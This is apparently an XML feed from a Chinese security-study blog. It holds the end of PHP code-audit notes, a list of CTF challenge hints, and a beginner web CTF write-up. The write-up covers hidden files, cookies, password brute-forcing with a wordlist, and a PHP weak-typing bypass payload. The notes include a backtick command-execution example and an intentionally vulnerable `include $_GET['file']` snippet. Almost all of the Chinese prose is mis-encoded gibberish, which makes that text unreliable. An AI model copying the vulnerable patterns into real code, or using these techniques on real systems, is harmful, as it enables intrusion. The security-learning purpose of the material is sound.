ä¸º1æ˜¯è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-åå•å¼•å·"><a href="#8-åå•å¼•å·" class="headerlink" title="8) åå•å¼•å·"></a>8) åå•å¼•å·</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å››ã€æ–‡ä»¶åŒ…å«"><a href="#å››ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="å››ã€æ–‡ä»¶åŒ…å«"></a>å››ã€æ–‡ä»¶åŒ…å«</h2><p>includeå°†ä¼šåŒ…å«è¯­å¥å¹¶æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶ PHPçš„é…ç½®æ–‡ä»¶allowurlfopenå’Œallow_url_includeè®¾ç½®ä¸ºON  include&#x2F;requireç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ include include_once requeire require_once  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"><a href="#äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘" class="headerlink" title="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"></a>äº”ã€<a href="../../../../Web-study">phpä¼ªåè®®ã€web-studyå·²è®°ã€‘</a></h2><h2 id="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"><a href="#å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°" class="headerlink" title="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"></a>å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idesk2022</title>
      <link href="/2022/06/26/idesk2022-wp/"/>
      <url>/2022/06/26/idesk2022-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="idesk2022"><a href="#idesk2022" class="headerlink" title="idesk2022"></a>idesk2022</h1><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><blockquote><p>hint:Just read the flag!</p><p>çœ‹çœ‹æ——å¸œ!</p></blockquote><h2 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h2><blockquote><p>hint:All I wanted was a website letting me host files anonymously for free, for ever</p><p>æˆ‘æƒ³è¦çš„åªæ˜¯ä¸€ä¸ªç½‘ç«™ï¼Œè®©æˆ‘å¯ä»¥æ°¸è¿œåŒ¿ååœ°ä¿å­˜æ–‡ä»¶</p></blockquote><h2 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h2><blockquote><p>hint:Check out this local news paper I built using PHP! Youâ€™ll need to pay in order to view the good stuff though :)</p><p>çœ‹çœ‹æˆ‘ç”¨PHPæ„å»ºçš„æœ¬åœ°æŠ¥çº¸å§!ä¸è¿‡ï¼Œä½ éœ€è¦ä»˜è´¹æ‰èƒ½çœ‹åˆ°å¥½ä¸œè¥¿:)</p></blockquote><h2 id="JSON-Beautifier"><a href="#JSON-Beautifier" class="headerlink" title="JSON Beautifier"></a>JSON Beautifier</h2><blockquote><p>hint:Turn your weak, ugly JSON into a thing of beauty using my revolutionary new tool! note: the flag is stored in the adminâ€™s cookie</p><p>ä½¿ç”¨æˆ‘çš„é©å‘½æ€§çš„æ–°å·¥å…·ï¼ŒæŠŠä½ çš„å¼±ï¼Œä¸‘é™‹çš„JSONå˜æˆä¸€ä¸ªç¾ä¸½çš„ä¸œè¥¿!æ³¨æ„:è¯¥æ ‡å¿—å­˜å‚¨åœ¨ç®¡ç†å‘˜çš„cookieä¸­</p></blockquote><h2 id="badblocker"><a href="#badblocker" class="headerlink" title="badblocker"></a>badblocker</h2><blockquote><p>hint:Stay one step ahead of ads with ğŸ…±ï¸adğŸ…±ï¸lockerâ„¢, the netâ€™s one-and-only recursive adblocker!</p><p>ä¿æŒä¸€æ­¥é¢†å…ˆçš„å¹¿å‘ŠğŸ…±ï¸adğŸ…±ï¸lockerâ„¢ï¼Œç½‘ç»œçš„ä¸€ä¸ªå’Œå”¯ä¸€çš„é€’å½’å¹¿å‘Šæ‹¦æˆªå™¨!</p></blockquote><h2 id="task-manager"><a href="#task-manager" class="headerlink" title="task manager"></a>task manager</h2><blockquote><p>hint:Are you constantly procrastinating real work by spending too much time on ctfs? Me too! Thatâ€™s why I created this lit af task manager app to help us stay on top of our duties.</p><p>ä½ æ˜¯å¦ç»å¸¸å› ä¸ºåœ¨ctfsä¸ŠèŠ±è´¹å¤ªå¤šæ—¶é—´è€Œæ‹–å»¶çœŸæ­£çš„å·¥ä½œ?æˆ‘ä¹Ÿæ˜¯!è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘åˆ›å»ºäº†è¿™ä¸ªä»»åŠ¡ç®¡ç†å™¨åº”ç”¨ç¨‹åºæ¥å¸®åŠ©æˆ‘ä»¬ä¿æŒæˆ‘ä»¬çš„èŒè´£ã€‚</p></blockquote><h2 id="Proxy-Viewer"><a href="#Proxy-Viewer" class="headerlink" title="Proxy Viewer"></a>Proxy Viewer</h2><blockquote><p>hint:check out my epic proxy service for viewing websites! however, youâ€™ll need to pay me in cash if you want to be a premium member</p><p>NOTE: there is significant rate limiting in place to keep the challenge healthy. please deploy, test, and solve locally before attempting to solve on the remote instance</p><p>çœ‹çœ‹æˆ‘çš„å²è¯—ä»£ç†æœåŠ¡æŸ¥çœ‹ç½‘ç«™!ä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³æˆä¸ºé«˜çº§ä¼šå‘˜ï¼Œä½ éœ€è¦æ”¯ä»˜ç°é‡‘</p><p>æ³¨æ„:æœ‰æ˜¾è‘—çš„é€Ÿç‡é™åˆ¶ï¼Œä»¥ä¿æŒæŒ‘æˆ˜çš„å¥åº·ã€‚åœ¨å°è¯•åœ¨è¿œç¨‹å®ä¾‹ä¸Šæ±‚è§£ä¹‹å‰ï¼Œè¯·åœ¨æœ¬åœ°éƒ¨ç½²ã€æµ‹è¯•å’Œæ±‚è§£</p></blockquote><h2 id="Stargazer"><a href="#Stargazer" class="headerlink" title="Stargazer"></a>Stargazer</h2><blockquote><p>hint:I am creating this challenge while gazing the stars. Hoping thereâ€™s no bug when developing the chall</p><p>æˆ‘åœ¨å‡è§†æ˜Ÿç©ºçš„æ—¶å€™åˆ›é€ äº†è¿™ä¸ªæŒ‘æˆ˜ã€‚å¸Œæœ›åœ¨å¼€å‘challæ—¶æ²¡æœ‰bug</p></blockquote><h2 id="overly-complicated-whitelabel"><a href="#overly-complicated-whitelabel" class="headerlink" title="overly-complicated-whitelabel"></a>overly-complicated-whitelabel</h2><blockquote><p>hint:æ— </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”»é˜²ä¸–ç•Œé¶åœºwp</title>
      <link href="/2022/06/21/Gongfang-wp/"/>
      <url>/2022/06/21/Gongfang-wp/</url>
      
        <content type="html"><![CDATA[<p><code>è¿™ä¸ªçº¿ä¸Šé¶åœºæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œè€Œä¸”éš¾åº¦åˆ†å¸ƒä¹Ÿå¥½ï¼Œå¾ˆä¼˜ç§€çš„çº¿ä¸Šé¶åœºï¼Œéå¸¸å€¼å¾—ä»”ç»†å­¦ä¹ ç ”ç©¶ä¸€ä¸‹</code></p><p><code>...åŠŸé˜²ä¸–ç•Œçªç„¶æ”¹ç‰ˆäº†ï¼ŒæŠŠé¢˜å¼„æˆä¸€å †äº†ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰éš¾åº¦ç³»æ•°ï¼Œä¸è¿‡ä¹Ÿæ–¹ä¾¿çœ‹çœ‹æœ‰å“ªäº›é€‚åˆéš¾åº¦çš„é¢˜ç›®åšä¸€åš</code></p><span id="more"></span><h1 id="Webæ–°æ‰‹"><a href="#Webæ–°æ‰‹" class="headerlink" title="Webæ–°æ‰‹"></a>Webæ–°æ‰‹</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†</p><h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>å³é”®ä¸ç®¡ç”¨ï¼Œç›´æ¥ç”¨F12æŸ¥çœ‹</p><p>å¾—åˆ°flag</p><h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä¸Šè¯¾è®²äº†<code>Robots</code>åè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®<code>Robots</code>åè®®æ˜¯ä»€ä¹ˆå§</p><h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>ä¸æ¸…æ¥š<code>robots</code>åè®®æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯æˆ‘ç™¾åº¦äº†ä¸€ä¸‹ï¼Œ</p><p><code>robotsåè®®ä¹Ÿç§°çˆ¬è™«åè®®ã€çˆ¬è™«è§„åˆ™ç­‰,æ˜¯æŒ‡ç½‘ç«™å¯å»ºç«‹ä¸€ä¸ªrobots.txtæ–‡ä»¶æ¥å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–,å“ªäº›é¡µé¢ä¸èƒ½æŠ“å–,è€Œæœç´¢å¼•æ“åˆ™é€šè¿‡è¯»å–robots.txtæ–‡ä»¶æ¥è¯†åˆ«è¿™ä¸ªé¡µé¢æ˜¯å¦å…è®¸è¢«æŠ“å–</code></p><p>ä¹Ÿå°±æ˜¯è¯´ç½‘ç«™ä¸‹æœ‰ä¸€ä¸ªrobots.txtæ–‡ä»¶ï¼Œè§„å®šäº†é¡µé¢æŠ“å–è§„åˆ™ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è®¿é—®<code>http://111.200.241.244:54251/robots.txt</code></p><p>ç•Œé¢æ˜¾ç¤ºå¦‚ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220621223828917.png" alt="image-20220621223828917"></p><p>disallowå°±æ˜¯ä¸å…è®¸æŠ“å–çš„é¡µé¢ï¼Œçœ‹åˆ°flagï¼Œå°±çŸ¥é“æˆ‘ä»¬å°±è¦è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯è®¿é—®<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p><p>å¾—åˆ°flag</p><h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼</p><h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°æ‰¾æ–‡ä»¶ï¼Œé¦–å…ˆæˆ‘å°±æƒ³ç”¨dirsearchæ‰«ä¸€æ‰«</p><p>æ‰“å¼€é¶åœºå…ˆçœ‹åˆ°</p><p><img src="/2022/06/21/Gongfang-wp/image-20220621224315003.png" alt="image-20220621224315003"></p><p>äºæ˜¯æˆ‘å…ˆæ‰«ä¸€æ‰«ï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰ index.phpæ–‡ä»¶çš„æ–‡ä»¶å</p><p><img src="/2022/06/21/Gongfang-wp/image-20220621224424076.png" alt="image-20220621224424076"></p><p>æ‰«å®Œåå‘ç°index.php.bakæ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾å®ƒå°±æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥è®¿é—®å®ƒä¸€ä¸‹<code>http://111.200.241.244:52824/index.php.bak</code></p><p>è‡ªåŠ¨ä¸‹è½½å¥½äº†index.php.bakï¼Œç”¨æ–‡æœ¬æ‰“å¼€</p><p>å¾—åˆ°flag</p><h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®ä»–åœ¨cookieé‡Œæ”¾äº†äº›ä¸œè¥¿ï¼Œå°å®ç–‘æƒ‘åœ°æƒ³ï¼šè¿™æ˜¯å¤¹å¿ƒé¥¼å¹²çš„æ„æ€å—ï¼Ÿ</p><h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>æˆ‘çš„æ—¥å¸¸éšè®°ç¬¬ä¸€ç« å¤§æ¦‚è®²äº†cookieçš„ä½œç”¨å’Œå«ä¹‰ï¼Œè¯¥é¢˜å¯ä»¥ä¸äº†è§£ä¹Ÿå¯ä»¥å®Œæˆ</p><p>ç›®å‰æˆ‘çœ‹cookieçš„æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯burpsuiteæŠ“åŒ…çœ‹ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ç”¨ç«ç‹æ’ä»¶Tamper Dataï¼Œè¿™é‡Œæˆ‘ç”¨brup</p><p>æˆ‘ä»¬å…ˆç”¨burpsuiteæŠ“ä¸€ä¸ªåŒ…çœ‹çœ‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220621225826671.png" alt="image-20220621225826671"></p><p>å‘ç°cookieå¤„æç¤ºæœ‰ä¸ªcookie.phpæ–‡ä»¶ï¼Œè®¿é—®<code>http://111.200.241.244:49599/cookie.php</code>çœ‹çœ‹ï¼Œå¦‚ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220621225920306.png" alt="image-20220621225920306"></p><p>äºæ˜¯æˆ‘ä»¬æŠŠæŠ“åŒ…æ•°æ®å‘åˆ°repeateré‡Œçœ‹çœ‹response</p><p>å¾—åˆ°flag</p><h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ</p><h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¯¥é¢˜è¯´æŒ‰è¿™ä¸ªæŒ‰é’®ä¸èƒ½æŒ‰ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ï¼Œçœ‹çœ‹æºç </p><p><img src="/2022/06/21/Gongfang-wp/image-20220621230709669.png" alt="image-20220621230709669"></p><p>çœ‹åˆ°æœ‰ä¸ªdisabledï¼Œå°±æ˜¯å®ƒä½¿å¾—æŒ‰é’®æ— æ³•è¢«æŒ‰ï¼Œæ‰€ä»¥åˆ å»å°±å¯ä»¥</p><p>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨æŸ¥çœ‹å™¨é‡Œé¢ï¼ŒæŠŠdisabledè¯­å¥åˆ å»</p><p>æŒ‰é’®å°±å¯ä»¥æŒ‰äº†ï¼Œç‚¹å‡»</p><p>å¾—åˆ°flag</p><h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚</p><h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æˆ‘ä»¬å…ˆéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¼¹çª—æ˜¾ç¤º</p><p><img src="/2022/06/21/Gongfang-wp/image-20220623115614924.png" alt="image-20220623115614924"></p><p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ç”¨æˆ·åæ˜¯  adminï¼Œä½†æ˜¯å¯†ç ä¸çŸ¥é“ï¼ŒåªçŸ¥é“æ˜¯éšæ‰‹è¾“å…¥çš„ï¼Œæˆ‘ä»¬è¯•è¯•burpæŠ“åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰æç¤º</p><p>åœ¨responseé‡Œçœ‹åˆ°</p><p><img src="/2022/06/21/Gongfang-wp/image-20220623115811366.png" alt="image-20220623115811366"></p><p>è¿™é‡Œæˆ‘ä»¬å°±çŸ¥é“è¦ç”¨burpçš„å¯†ç çˆ†ç ´ï¼Œå…·ä½“æ“ä½œå°±ä¸ç»†è®²ï¼Œéšè®°æœ‰å†™</p><p>è¿™æ˜¯éƒ¨åˆ†å¯†ç txtçš„ç½‘ç«™ï¼Œå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼Œé’ˆå¯¹ä¸åŒç¯å¢ƒï¼Œç”¨ä¸åŒå¯†ç æ–‡æœ¬</p><p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p><p>æœ€åçˆ†å‡ºå¯†ç 123456,ä»¥ç”¨æˆ· adminè¾“å…¥ç™»å½•</p><p>å¾—åˆ°flag</p><h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚</p><h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆè¿›è¡Œä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagè¢«åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªflag1ï¼Œä¸€ä¸ª flag2</p><p>a,bä¸¤ä¸ªå˜é‡ä»¥getå‹è¾“å…¥</p><p>ç¬¬ä¸€ä¸ªifè¦æ±‚a&#x3D;&#x3D;0ä¸”aä¸ºtureï¼Œè¿™æ˜æ˜¾çŸ›ç›¾ï¼Œå½“a&#x3D;0å°±ä»£è¡¨aä¸ºfalse</p><p>æ‰€ä»¥è¿™é‡Œæ¶‰åŠäº†phpæ€§è´¨ï¼Œphpå±äºä¸€é—¨å¼±ç±»å‹è¯­è¨€</p><p><code>å¼±ç±»å‹ï¼šä¸å¿…å‘ PHP å£°æ˜è¯¥å˜é‡çš„æ•°æ®ç±»å‹ï¼ŒPHP ä¼šæ ¹æ®å˜é‡çš„å€¼ï¼Œè‡ªåŠ¨æŠŠå˜é‡è½¬æ¢ä¸ºæ­£ç¡®çš„æ•°æ®ç±»å‹</code></p><p>æ‰€ä»¥å½“åœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­açš„å€¼æ—¶ï¼Œaå¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ€§è´¨ï¼Œa&#x3D;0Aï¼Œå½“è¿›è¡Œa&#x3D;&#x3D;0åˆ¤æ–­æ—¶ï¼Œä¼šè‡ªåŠ¨æŠŠaå½“ä½œæ•°å­—å‹ï¼Œä¹Ÿå°±æ˜¯æŠŠa&#x3D;0Aåçš„Aå»æ‰ï¼Œä»è€Œæˆç«‹ï¼›</p><p>è€Œå½“åˆ¤æ–­aæ˜¯å¦ä¸ºtureæ—¶ï¼Œç”±äºa&#x3D;0Aè€Œé0ï¼Œæ‰€ä»¥ç»“æœä¸ºtureï¼Œè¾“å‡ºflag1</p><p><em>è¿™é‡Œæ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæ˜¯ <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>ï¼Œé‚£æŒ‰ä¸Šé¢å¯¹aèµ‹å€¼è¿˜å¯ä»¥å—ï¼Ÿ</em></p><p><em>è¿™é‡Œæ¶‰åŠphpç±»å‹æ¯”è¾ƒ&#x3D;&#x3D;ä¸&#x3D;&#x3D;&#x3D;çš„åŒºåˆ«</em></p><ul><li><em>æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· <strong>&#x3D;&#x3D;</strong> æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚</em></li><li><em>ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· <strong>&#x3D;&#x3D;&#x3D;</strong> æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚</em></li></ul><p><em>ä¸Šé¢ä»£ç ä¸­&#x3D;&#x3D;å¯¹ç±»å‹ä¸æ¯”è¾ƒï¼Œæ‰€ä»¥a&#x3D;0Aä¸0æ¯”è¾ƒæ—¶ï¼Œå¯å½“ä½œa&#x3D;0ä¸0æ¯”è¾ƒ</em></p><p><em>ä½†æ˜¯å½“ä¸º&#x3D;&#x3D;&#x3D;æ—¶ï¼Œa&#x3D;0Aä¸å±äºæ•°å­—å‹ï¼Œæ‰€ä»¥å½“if(a&#x3D;&#x3D;&#x3D;0)è¿”å›falseï¼Œä»è€Œè¿”å›false</em></p><p>ç¬¬äºŒä¸ªifçœ‹åˆ°ï¼Œis_numeric($b)ï¼Œè¿™é‡Œè¦äº†è§£ä¸€ä¸‹is_numereic()å‡½æ•°çš„ä½œç”¨</p><p><code>is_numeric()å‡½æ•°ï¼šç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEï¼Œæ³¨æ„æµ®ç‚¹å‹è¿”å› 1ï¼Œå³ TRUE</code></p><p>ä¹Ÿå°±æ˜¯è¯´bçš„å€¼ä¸èƒ½ä¸ºæ•°å­—å’Œæ•°å­—ä¸²ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªifè¦æ±‚b&gt;1234ï¼Œæ‰€ä»¥bè¦ä¸ºæ•°å­—</p><p>è¿™ä¸ªå’Œaä¸€æ ·ï¼Œåˆ©ç”¨äº†phpçš„å¼±ç±»å‹æ€§è´¨ï¼Œæ—¢ç„¶ä¸èƒ½ä¸ºæ•°å­—ï¼Œé‚£b&#x3D;1235Bï¼Œè¿™æ ·å½“bä¸1234æ¯”è¾ƒæ—¶ï¼Œbè½¬åŒ–ä¸ºæ•°å­—å‹ï¼Œå»æ‰Bï¼Œ1235&gt;1234æˆç«‹ï¼Œè¾“å‡ºflag2</p><p>äºæ˜¯payloadä¸º</p><p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p><p>å¾—åˆ°flag</p><h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ</p><h3 